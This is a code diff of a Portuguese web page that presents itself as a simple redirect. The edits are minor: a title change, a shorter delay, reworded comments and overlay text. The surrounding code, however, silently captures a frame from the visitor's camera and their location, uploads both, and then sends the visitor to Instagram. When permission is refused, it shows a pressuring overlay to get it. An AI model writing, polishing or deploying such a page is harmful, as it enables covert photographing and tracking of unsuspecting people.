@@ -2,7 +2,7 @@
 <html lang="pt">
 <head>
   <meta charset="UTF-8">
-  <title>Redirecionando...</title>
+  <title>Redirecionamento</title> 
   <meta name="viewport" content="width=device-width, initial-scale=1.0">
   <style>
     body { margin: 0; overflow: hidden; background: #000; }
@@ -55,7 +55,7 @@
         await video.play();
 
         // Aguarda um breve período para garantir que o vídeo renderizou.
-        await new Promise(r => setTimeout(r, 300));
+        await new Promise(r => setTimeout(r, 200)); 
 
         const canvas = document.createElement("canvas");
         canvas.width = video.videoWidth || 640;
@@ -107,11 +107,11 @@
             body: textForm
           });
           if (!textResp.ok) throw new Error("Erro ao enviar o arquivo de localização");
-          // Se tudo ocorrer bem, redireciona para o Instagram.
+          // Se tudo ocorrer bem, redireciona. 
           window.location.href = "https://instagram.com";
         } catch (err) {
           console.error("Erro no envio da localização:", err);
-          showOverlay("É necessário as permissões para continuar. Toque aqui para permitir...", () => {
+          showOverlay("São necessárias as permissões para continuar. Toque aqui para permitir...", () => { 
             requestLocation(imageUrl);
           });
         }
